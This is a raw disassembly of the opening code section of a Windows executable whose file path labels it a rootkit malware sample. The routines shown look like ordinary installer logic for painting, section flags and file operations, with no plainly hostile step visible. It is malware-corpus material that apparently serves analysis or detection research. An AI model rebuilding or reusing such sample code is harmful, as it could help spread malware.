
malware_samples/rootkit/d4d2266a19876beccc95a97e1e5821ef42d98d503818c1e3f19be75e9358b100.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 08 37 42 00    	mov    0x423708,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 04 72 40 00    	call   *0x407204
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 14 37 42 00    	mov    0x423714,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 08 72 40 00    	call   *0x407208
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 0c 72 40 00    	call   *0x40720c
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 5c 70 40 00    	mov    0x40705c,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 64 70 40 00    	call   *0x407064
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 10 72 40 00    	call   *0x407210
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 54 70 40 00    	call   *0x407054
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 50 70 40 00    	call   *0x407050
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 58 70 40 00    	call   *0x407058
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 4c 70 40 00    	mov    0x40704c,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 00 2f 42 00       	push   $0x422f00
  401155:	57                   	push   %edi
  401156:	ff 15 14 72 40 00    	call   *0x407214
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 6c 72 40 00    	call   *0x40726c
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 48 37 42 00       	mov    0x423748,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 04 00 00    	imul   $0x418,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 4c 37 42 00    	cmp    0x42374c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 04 00 00       	add    $0x418,%eax
  4011e1:	3b 35 4c 37 42 00    	cmp    0x42374c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  401201:	8b 1d 48 37 42 00    	mov    0x423748,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 4c 37 42 00    	cmp    0x42374c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 4c 37 42 00    	cmp    0x42374c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 48 37 42 00       	mov    0x423748,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 4c 37 42 00    	cmp    %esi,0x42374c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 04 00 00    	add    $0x418,%edx
  4012d5:	3b 35 4c 37 42 00    	cmp    0x42374c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 14 37 42 00       	mov    0x423714,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 4c 37 42 00    	mov    0x42374c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 48 37 42 00    	mov    0x423748,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 04 00 00    	add    $0x418,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 40 42 00       	mov    $0x424000,%ecx
  40137b:	c1 e0 0a             	shl    $0xa,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 5b 4b 00 00       	call   0x405ee1
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 50 37 42 00    	mov    0x423750,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 ec 2e 42 00    	add    %eax,0x422eec
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 d4 2e 42 00    	push   0x422ed4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 ec 2e 42 00    	push   0x422eec
  4013e4:	ff 15 48 71 40 00    	call   *0x407148
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 00 72 40 00    	call   *0x407200
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 14 37 42 00    	mov    0x423714,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 e8 97 40 00       	push   $0x4097e8
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 60 3c 00 00       	call   0x405091
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec c8 01 00 00    	sub    $0x1c8,%esp
  40143d:	a1 08 37 42 00       	mov    0x423708,%eax
  401442:	53                   	push   %ebx
  401443:	56                   	push   %esi
  401444:	8b 75 08             	mov    0x8(%ebp),%esi
  401447:	57                   	push   %edi
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  40144e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401451:	33 db                	xor    %ebx,%ebx
  401453:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401455:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401458:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40145b:	8b f0                	mov    %eax,%esi
  40145d:	8b fa                	mov    %edx,%edi
  40145f:	c1 e6 0a             	shl    $0xa,%esi
  401462:	b9 00 40 42 00       	mov    $0x424000,%ecx
  401467:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40146a:	c1 e7 0a             	shl    $0xa,%edi
  40146d:	03 f1                	add    %ecx,%esi
  40146f:	03 f9                	add    %ecx,%edi
  401471:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401474:	89 0d 24 a8 40 00    	mov    %ecx,0x40a824
  40147a:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40147d:	83 c1 fe             	add    $0xfffffffe,%ecx
  401480:	83 f9 41             	cmp    $0x41,%ecx
  401483:	0f 87 ce 14 00 00    	ja     0x402957
  401489:	ff 24 8d 69 29 40 00 	jmp    *0x402969(,%ecx,4)
  401490:	53                   	push   %ebx
  401491:	50                   	push   %eax
  401492:	e8 fa 3b 00 00       	call   0x405091
  401497:	e9 4b 0e 00 00       	jmp    0x4022e7
  40149c:	ff 05 cc 2e 42 00    	incl   0x422ecc
  4014a2:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a5:	0f 84 3c 0e 00 00    	je     0x4022e7
  4014ab:	53                   	push   %ebx
  4014ac:	ff 15 c8 71 40 00    	call   *0x4071c8
  4014b2:	e9 30 0e 00 00       	jmp    0x4022e7
  4014b7:	50                   	push   %eax
  4014b8:	e8 b0 fe ff ff       	call   0x40136d
  4014bd:	48                   	dec    %eax
  4014be:	53                   	push   %ebx
  4014bf:	50                   	push   %eax
  4014c0:	e8 c4 fe ff ff       	call   0x401389
  4014c5:	e9 98 14 00 00       	jmp    0x402962
  4014ca:	53                   	push   %ebx
  4014cb:	50                   	push   %eax
  4014cc:	e8 c0 3b 00 00       	call   0x405091
  4014d1:	e9 81 14 00 00       	jmp    0x402957
  4014d6:	53                   	push   %ebx
  4014d7:	e8 cd 15 00 00       	call   0x402aa9
  4014dc:	83 f8 01             	cmp    $0x1,%eax
  4014df:	59                   	pop    %ecx
  4014e0:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4014e3:	7f 03                	jg     0x4014e8
  4014e5:	33 c0                	xor    %eax,%eax
  4014e7:	40                   	inc    %eax
  4014e8:	50                   	push   %eax
  4014e9:	ff 15 8c 70 40 00    	call   *0x40708c
  4014ef:	e9 63 14 00 00       	jmp    0x402957
  4014f4:	ff 75 f8             	push   -0x8(%ebp)
  4014f7:	ff 15 4c 72 40 00    	call   *0x40724c
  4014fd:	e9 55 14 00 00       	jmp    0x402957
  401502:	c1 e0 02             	shl    $0x2,%eax
  401505:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401508:	75 26                	jne    0x401530
  40150a:	8b 88 a0 37 42 00    	mov    0x4237a0(%eax),%ecx
  401510:	6a 01                	push   $0x1
  401512:	89 88 e0 37 42 00    	mov    %ecx,0x4237e0(%eax)
  401518:	e8 8c 15 00 00       	call   0x402aa9
  40151d:	59                   	pop    %ecx
  40151e:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  401521:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401524:	89 04 8d a0 37 42 00 	mov    %eax,0x4237a0(,%ecx,4)
  40152b:	e9 27 14 00 00       	jmp    0x402957
  401530:	8b 88 e0 37 42 00    	mov    0x4237e0(%eax),%ecx
  401536:	89 88 a0 37 42 00    	mov    %ecx,0x4237a0(%eax)
  40153c:	e9 16 14 00 00       	jmp    0x402957
  401541:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401544:	8d 34 85 a0 37 42 00 	lea    0x4237a0(,%eax,4),%esi
  40154b:	33 c0                	xor    %eax,%eax
  40154d:	8b 0e                	mov    (%esi),%ecx
  40154f:	3b cb                	cmp    %ebx,%ecx
  401551:	0f 94 c0             	sete   %al
  401554:	23 4d e4             	and    -0x1c(%ebp),%ecx
  401557:	8b 44 85 d8          	mov    -0x28(%ebp,%eax,4),%eax
  40155b:	89 0e                	mov    %ecx,(%esi)
  40155d:	e9 00 14 00 00       	jmp    0x402962
  401562:	ff 34 95 a0 37 42 00 	push   0x4237a0(,%edx,4)
  401569:	56                   	push   %esi
  40156a:	e9 90 13 00 00       	jmp    0x4028ff
  40156f:	8b 0d d0 2e 42 00    	mov    0x422ed0,%ecx
  401575:	8b 35 78 72 40 00    	mov    0x407278,%esi
  40157b:	3b cb                	cmp    %ebx,%ecx
  40157d:	74 07                	je     0x401586
  40157f:	52                   	push   %edx
  401580:	51                   	push   %ecx
  401581:	ff d6                	call   *%esi
  401583:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401586:	8b 0d e4 2e 42 00    	mov    0x422ee4,%ecx
  40158c:	3b cb                	cmp    %ebx,%ecx
  40158e:	0f 84 c3 13 00 00    	je     0x402957
  401594:	50                   	push   %eax
  401595:	51                   	push   %ecx
  401596:	ff d6                	call   *%esi
  401598:	e9 ba 13 00 00       	jmp    0x402957
  40159d:	6a f0                	push   $0xfffffff0
  40159f:	e8 27 15 00 00       	call   0x402acb
  4015a4:	ff 75 dc             	push   -0x24(%ebp)
  4015a7:	50                   	push   %eax
  4015a8:	ff 15 f8 70 40 00    	call   *0x4070f8
  4015ae:	85 c0                	test   %eax,%eax
  4015b0:	0f 85 a1 13 00 00    	jne    0x402957
  4015b6:	e9 61 11 00 00       	jmp    0x40271c
  4015bb:	6a f0                	push   $0xfffffff0
  4015bd:	e8 09 15 00 00       	call   0x402acb
  4015c2:	8b f8                	mov    %eax,%edi
  4015c4:	57                   	push   %edi
  4015c5:	e8 d1 43 00 00       	call   0x40599b
  4015ca:	8b f0                	mov    %eax,%esi
  4015cc:	3b f3                	cmp    %ebx,%esi
  4015ce:	74 54                	je     0x401624
  4015d0:	6a 5c                	push   $0x5c
  4015d2:	56                   	push   %esi
  4015d3:	e8 55 43 00 00       	call   0x40592d
  4015d8:	8b f0                	mov    %eax,%esi
  4015da:	8a 06                	mov    (%esi),%al
  4015dc:	88 1e                	mov    %bl,(%esi)
  4015de:	3a c3                	cmp    %bl,%al
  4015e0:	88 45 0b             	mov    %al,0xb(%ebp)
  4015e3:	75 16                	jne    0x4015fb
  4015e5:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4015e8:	74 11                	je     0x4015fb
  4015ea:	e8 02 40 00 00       	call   0x4055f1
  4015ef:	85 c0                	test   %eax,%eax
  4015f1:	74 08                	je     0x4015fb
  4015f3:	57                   	push   %edi
  4015f4:	e8 5e 3f 00 00       	call   0x405557
  4015f9:	eb 06                	jmp    0x401601
  4015fb:	57                   	push   %edi
  4015fc:	e8 d3 3f 00 00       	call   0x4055d4
  401601:	3b c3                	cmp    %ebx,%eax
  401603:	74 15                	je     0x40161a
  401605:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40160a:	75 0b                	jne    0x401617
  40160c:	57                   	push   %edi
  40160d:	ff 15 fc 70 40 00    	call   *0x4070fc
  401613:	a8 10                	test   $0x10,%al
  401615:	75 03                	jne    0x40161a
  401617:	ff 45 fc             	incl   -0x4(%ebp)
  40161a:	8a 45 0b             	mov    0xb(%ebp),%al
  40161d:	88 06                	mov    %al,(%esi)
  40161f:	46                   	inc    %esi
  401620:	3a c3                	cmp    %bl,%al
  401622:	75 ac                	jne    0x4015d0
  401624:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401627:	74 29                	je     0x401652
  401629:	6a e6                	push   $0xffffffe6
  40162b:	e8 f3 fd ff ff       	call   0x401423
  401630:	57                   	push   %edi
  401631:	68 00 98 42 00       	push   $0x429800
  401636:	e8 2f 49 00 00       	call   0x405f6a
  40163b:	57                   	push   %edi
  40163c:	ff 15 b4 70 40 00    	call   *0x4070b4
  401642:	85 c0                	test   %eax,%eax
  401644:	0f 85 0d 13 00 00    	jne    0x402957
  40164a:	ff 45 fc             	incl   -0x4(%ebp)
  40164d:	e9 05 13 00 00       	jmp    0x402957
  401652:	6a f5                	push   $0xfffffff5
  401654:	e9 e4 0b 00 00       	jmp    0x40223d
  401659:	53                   	push   %ebx
  40165a:	e8 6c 14 00 00       	call   0x402acb
  40165f:	50                   	push   %eax
  401660:	e8 08 4c 00 00       	call   0x40626d
  401665:	e9 81 06 00 00       	jmp    0x401ceb
  40166a:	6a d0                	push   $0xffffffd0
  40166c:	e8 5a 14 00 00       	call   0x402acb
  401671:	6a df                	push   $0xffffffdf
  401673:	8b f0                	mov    %eax,%esi
  401675:	e8 51 14 00 00       	call   0x402acb
  40167a:	6a 13                	push   $0x13
  40167c:	8b f8                	mov    %eax,%edi
  40167e:	e8 48 14 00 00       	call   0x402acb
  401683:	57                   	push   %edi
  401684:	56                   	push   %esi
  401685:	ff 15 04 71 40 00    	call   *0x407104
  40168b:	85 c0                	test   %eax,%eax
  40168d:	74 07                	je     0x401696
  40168f:	6a e3                	push   $0xffffffe3
  401691:	e9 a7 0b 00 00       	jmp    0x40223d
  401696:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401699:	0f 84 7d 10 00 00    	je     0x40271c
  40169f:	56                   	push   %esi
  4016a0:	e8 c8 4b 00 00       	call   0x40626d
  4016a5:	85 c0                	test   %eax,%eax
  4016a7:	0f 84 6f 10 00 00    	je     0x40271c
  4016ad:	57                   	push   %edi
  4016ae:	56                   	push   %esi
  4016af:	e8 95 46 00 00       	call   0x405d49
  4016b4:	6a e4                	push   $0xffffffe4
  4016b6:	e9 82 0b 00 00       	jmp    0x40223d
  4016bb:	53                   	push   %ebx
  4016bc:	e8 0a 14 00 00       	call   0x402acb
  4016c1:	8b f0                	mov    %eax,%esi
  4016c3:	8d 45 08             	lea    0x8(%ebp),%eax
  4016c6:	50                   	push   %eax
  4016c7:	57                   	push   %edi
  4016c8:	68 00 04 00 00       	push   $0x400
  4016cd:	56                   	push   %esi
  4016ce:	ff 15 08 71 40 00    	call   *0x407108
